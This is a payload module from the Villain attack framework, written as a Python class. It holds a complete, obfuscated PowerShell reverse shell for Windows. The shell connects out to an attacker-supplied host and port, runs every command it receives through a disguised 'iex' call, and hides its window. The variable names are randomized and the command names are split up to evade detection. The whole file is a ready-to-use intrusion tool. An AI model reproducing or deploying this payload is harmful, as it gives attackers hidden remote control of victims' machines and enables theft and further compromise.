# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic PowerShell Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'netcat',
        'type' : 'powershell-reverse-tcp',
        'os' : 'windows'
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {
        'encode' : True
    }

    data = "Start-Process $PSHOME\powershell.exe -ArgumentList {$e84e5b55fd8645858845f13249bb6e06 = New-Object System.Net.Sockets.TCPClient('*LHOST*',*LPORT*);$62a10ac9d7ca40b186150094ecc14ae4 = $e84e5b55fd8645858845f13249bb6e06.GetStream();[byte[]]$9fb80f6bd32441a2a1b58212939cab20 = 0..65535|%{0};while(($i = $62a10ac9d7ca40b186150094ecc14ae4.Read($9fb80f6bd32441a2a1b58212939cab20, 0, $9fb80f6bd32441a2a1b58212939cab20.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($9fb80f6bd32441a2a1b58212939cab20,0, $i);$sendback = (i""e''x"" $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (p""w''d"").Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$62a10ac9d7ca40b186150094ecc14ae4.Write($sendbyte,0,$sendbyte.Length);$62a10ac9d7ca40b186150094ecc14ae4.Flush()};$e84e5b55fd8645858845f13249bb6e06.Close()} -WindowStyle Hidden"
